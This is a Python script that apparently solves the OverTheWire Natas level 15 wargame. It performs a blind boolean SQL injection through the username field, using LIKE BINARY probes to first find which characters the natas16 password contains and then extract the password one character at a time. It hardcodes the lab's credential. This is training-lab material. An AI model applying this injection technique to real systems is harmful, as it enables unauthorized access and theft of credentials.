#!/bin/python3

import requests
import string

site = "http://natas15.natas.labs.overthewire.org"
auth = ("natas15", "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB")


def stepOne():
    chars = ''.join([string.ascii_letters, string.digits])
    dict = []
    for char in chars:
        data = {'username': 'natas16" and password LIKE BINARY "%' +
                char+'%', 'debug': ''}
        res = requests.post(site, auth=auth,  data=data)
        if 'This user exists' in res.text:
            dict.append(char)
            print(dict)
    print(''.join(dict))

# Runnnig stepOne will produce: adfgijklqruADEHOPRTVZ23579
# stepOne()

def stepTwo():
    dict = "adfgijklqruADEHOPRTVZ23579"
    password = []
    for i in range(1, 64):
        for char in dict:
            tmpPassArr = password[:]
            tmpPassArr.append(char)
            tmpPass = ''.join(tmpPassArr)
            data = {'username': 'natas16" and password LIKE BINARY "' + tmpPass + '%', 'debug': ''}
            res = requests.post(site, auth=auth,  data=data)
            print("Requesting " + tmpPass)
            if 'This user exists' in res.text:
                password.append(char)
                break
        print('PASS: ' + ''.join(password))

stepTwo()
